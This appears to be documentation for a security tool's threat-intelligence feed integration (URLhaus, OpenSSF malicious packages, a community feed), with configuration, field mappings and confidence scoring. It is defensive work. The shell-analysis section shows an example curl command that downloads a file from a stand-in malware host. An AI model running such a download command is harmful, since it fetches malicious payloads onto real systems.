# Feeds

Arbitraitor integrates with threat intelligence feeds to enrich detection findings.

## URLhaus

URLhaus is an Abuse.ch project that tracks malware distribution URLs.

### Configuration

```toml
[intel.feeds.urlhaus]
enabled = true
url = "https://urlhaus.abuse.ch/downloads/json/"
# api-key is optional for public access
# api-key = "secret://env/URLHAUS_API_KEY"
refresh-interval = "1h"
cache-ttl = "24h"
```

### Feed format

URLhaus provides JSON in this format:

```json
[
  {
    "id": "12345",
    "urlhaus_status": "online",
    "url": "https://evil.example.com/malware.exe",
    "url_status": "online",
    "threat": "malware_download",
    "tags": ["trojan", "payload"],
    "payload_status": "online",
    "firstseen": "2026-06-01 12:00:00 UTC",
    "lastseen": "2026-06-20 08:00:00 UTC",
    "sophos_threat": "Trojan.Generic"
  }
]
```

### Indicator mapping

| URLhaus field | Arbitraitor field |
|--------------|-------------------|
| `url` | `indicator.value` |
| `threat` | `tags[]` |
| `sophos_threat` | `tags[]` |
| `firstseen` | metadata |
| `lastseen` | `last-seen` |
| `urlhaus_status` == "offline" | Ignored |

### Confidence scoring

URLhaus matches are scored by recency:

| Last seen | Confidence |
|-----------|-----------|
| < 24 hours | High |
| < 7 days | Medium |
| >= 7 days | Low |
| Unknown | Low |

### Using URLhaus with shell analysis

When the shell detector finds a `curl` or `wget` command, it automatically queries URLhaus for the download URL:

```sh
curl -fsSL https://evil.example.com/malware.exe
```

If the URL is in URLhaus:

```
Findings:
  network:curl              high      Downloads content via curl
  ├─ Intel: URLhaus         high      Known malware download URL
  │  └─ https://evil.example.com/malware.exe
  └─ Malware type: Trojan.Generic
```

### Freshness requirements

URLhaus is expected to be current within 1 hour. The feed is refreshed automatically and cached locally.

### Offline behavior

If URLhaus cannot be reached during a pipeline run:

- Fresh cache available: Use cached data, log warning
- No cache: Skip URLhaus lookup, proceed without intelligence enrichment
- Intelligence lookup failure never blocks inspection

## OpenSSF malicious packages

OpenSSF malicious-packages publishes malicious package reports as OSV
advisories with `MAL-YYYY-NNNN` identifiers. Arbitraitor ingests these as
`osv-mal` indicators from OSV.dev `querybatch` responses or signed mirrors.

### Update command

```sh
arbitraitor intel update --ossf-malicious-packages
```

Use `--ossf-malicious-packages-url` to point at a pre-fetched signed mirror or
test fixture. Network access is explicit; package inspection does not perform
implicit live OSV lookups.

### Indicator mapping

| OSV field | Arbitraitor field |
|-----------|-------------------|
| `id` beginning with `MAL-` | `indicator.value` with `indicator_type = "osv-mal"` |
| `modified` / `published` | `source_update_time`, `first_seen` |
| `affected[].package` | evidence package label |
| `summary` / `details` / `aliases` | evidence notes |

### Freshness requirements

OpenSSF malicious-package snapshots are Tier-1 current when mirrored from OSV
data updated within 24 hours. Policies that require current package-malware
intelligence fail closed when the signed snapshot is stale or unavailable.

## Community Feed

The ArbSec community feed aggregates indicators submitted by users and reviewed by the security team.

### Configuration

```toml
[intel.feeds.community]
enabled = true
url = "https://api.arbitraitor.org/community/indicators"
api-key = "secret://env/COMMUNITY_API_KEY"
refresh-interval = "6h"
cache-ttl = "24h"
```

### Submission process

1. User submits indicator via CLI or API
2. Automated checks (duplicates, formatting)
3. Manual review by ArbSec security team
4. Approved indicators published to feed

See [Community Submissions](./submissions.md) for the full submission workflow.

### Indicator trust

Community indicators are tagged by review status:

| Tag | Meaning |
|-----|---------|
| `reviewed` | Manually reviewed by security team |
| `automated` | Added by automated pipeline |
| `source:user` | Submitted by verified user |

The confidence score reflects the review depth.
